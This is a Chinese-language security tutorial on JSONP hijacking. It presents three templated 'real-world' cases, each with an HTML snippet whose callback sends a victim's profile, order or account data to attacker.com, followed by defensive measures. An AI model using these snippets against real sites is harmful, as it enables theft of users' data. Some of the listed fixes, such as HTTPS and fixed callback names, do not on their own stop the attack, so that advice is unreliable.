# JSONP劫持漏洞的案例分析

## 1. 概述

JSONP（JSON with Padding）是一种用于跨域数据请求的技术，它通过动态创建`<script>`标签来加载远程数据。由于JSONP依赖于回调函数，攻击者可以利用这一特性实施JSONP劫持攻击，窃取用户的敏感数据。本文将通过真实世界中的案例，深入分析JSONP劫持漏洞的原理、攻击手法及其危害。

## 2. 原理

JSONP劫持漏洞的核心在于攻击者能够诱使受害者的浏览器执行恶意脚本，从而窃取通过JSONP接口返回的敏感数据。具体步骤如下：

1. **诱骗用户访问恶意页面**：攻击者通过钓鱼邮件、恶意广告等方式诱骗用户访问包含恶意脚本的页面。
2. **动态创建`<script>`标签**：恶意页面中动态创建一个`<script>`标签，指向目标网站的JSONP接口，并指定一个回调函数。
3. **窃取数据**：当目标网站的JSONP接口返回数据时，数据会被传递给恶意页面中定义的回调函数，攻击者可以在回调函数中窃取这些数据。

## 3. 案例分析

### 3.1 案例一：某社交平台的JSONP劫持漏洞

#### 背景
某社交平台提供了一个JSONP接口，用于获取用户的个人信息，包括用户名、邮箱地址等敏感数据。该接口未对请求来源进行验证，导致存在JSONP劫持漏洞。

#### 攻击过程
1. **构造恶意页面**：攻击者创建了一个恶意页面，页面中包含以下代码：
   ```html
   <script>
   function stealData(data) {
       // 将窃取的数据发送到攻击者的服务器
       var img = new Image();
       img.src = "http://attacker.com/steal?data=" + encodeURIComponent(JSON.stringify(data));
   }
   </script>
   <script src="https://vulnerable-social-platform.com/userinfo?callback=stealData"></script>
   ```
2. **诱骗用户访问**：攻击者通过钓鱼邮件诱骗用户访问该恶意页面。
3. **窃取数据**：当用户访问恶意页面时，浏览器会加载并执行恶意脚本，向社交平台的JSONP接口发送请求。接口返回的用户数据会被传递给`stealData`函数，攻击者通过该函数将数据发送到自己的服务器。

#### 漏洞修复
社交平台修复了该漏洞，具体措施包括：
- **验证请求来源**：只允许来自信任域的请求访问JSONP接口。
- **使用CSRF令牌**：在JSONP请求中添加CSRF令牌，确保请求来自合法的用户会话。

### 3.2 案例二：某电商网站的JSONP劫持漏洞

#### 背景
某电商网站提供了一个JSONP接口，用于获取用户的订单信息，包括订单号、商品名称、价格等敏感数据。该接口未对回调函数进行验证，导致存在JSONP劫持漏洞。

#### 攻击过程
1. **构造恶意页面**：攻击者创建了一个恶意页面，页面中包含以下代码：
   ```html
   <script>
   function stealOrder(data) {
       // 将窃取的数据发送到攻击者的服务器
       var img = new Image();
       img.src = "http://attacker.com/steal?data=" + encodeURIComponent(JSON.stringify(data));
   }
   </script>
   <script src="https://vulnerable-ecommerce-site.com/orders?callback=stealOrder"></script>
   ```
2. **诱骗用户访问**：攻击者通过恶意广告诱骗用户访问该恶意页面。
3. **窃取数据**：当用户访问恶意页面时，浏览器会加载并执行恶意脚本，向电商网站的JSONP接口发送请求。接口返回的订单数据会被传递给`stealOrder`函数，攻击者通过该函数将数据发送到自己的服务器。

#### 漏洞修复
电商网站修复了该漏洞，具体措施包括：
- **限制回调函数名称**：只允许预定义的回调函数名称，防止攻击者指定恶意回调函数。
- **使用CORS替代JSONP**：改用CORS（跨域资源共享）技术，避免使用JSONP。

### 3.3 案例三：某金融应用的JSONP劫持漏洞

#### 背景
某金融应用提供了一个JSONP接口，用于获取用户的账户余额和交易记录。该接口未对请求进行身份验证，导致存在JSONP劫持漏洞。

#### 攻击过程
1. **构造恶意页面**：攻击者创建了一个恶意页面，页面中包含以下代码：
   ```html
   <script>
   function stealFinancialData(data) {
       // 将窃取的数据发送到攻击者的服务器
       var img = new Image();
       img.src = "http://attacker.com/steal?data=" + encodeURIComponent(JSON.stringify(data));
   }
   </script>
   <script src="https://vulnerable-financial-app.com/account?callback=stealFinancialData"></script>
   ```
2. **诱骗用户访问**：攻击者通过社交工程手段诱骗用户访问该恶意页面。
3. **窃取数据**：当用户访问恶意页面时，浏览器会加载并执行恶意脚本，向金融应用的JSONP接口发送请求。接口返回的账户数据会被传递给`stealFinancialData`函数，攻击者通过该函数将数据发送到自己的服务器。

#### 漏洞修复
金融应用修复了该漏洞，具体措施包括：
- **强制身份验证**：要求所有JSONP请求必须携带有效的身份验证令牌。
- **使用HTTPS**：确保所有JSONP请求通过HTTPS传输，防止数据被中间人攻击窃取。

## 4. 防御措施

通过以上案例分析，我们可以总结出以下防御JSONP劫持漏洞的措施：

1. **验证请求来源**：只允许来自信任域的请求访问JSONP接口。
2. **限制回调函数名称**：只允许预定义的回调函数名称，防止攻击者指定恶意回调函数。
3. **使用CSRF令牌**：在JSONP请求中添加CSRF令牌，确保请求来自合法的用户会话。
4. **强制身份验证**：要求所有JSONP请求必须携带有效的身份验证令牌。
5. **使用CORS替代JSONP**：改用CORS技术，避免使用JSONP。
6. **使用HTTPS**：确保所有JSONP请求通过HTTPS传输，防止数据被中间人攻击窃取。

## 5. 结论

JSONP劫持漏洞是一种严重的安全威胁，攻击者可以通过该漏洞窃取用户的敏感数据。通过分析真实世界中的案例，我们可以更好地理解该漏洞的原理和攻击手法，并采取有效的防御措施。开发者应避免使用JSONP，或在使用时严格实施安全措施，以保护用户的数据安全。

---

*文档生成时间: 2025-03-11 14:24:01*
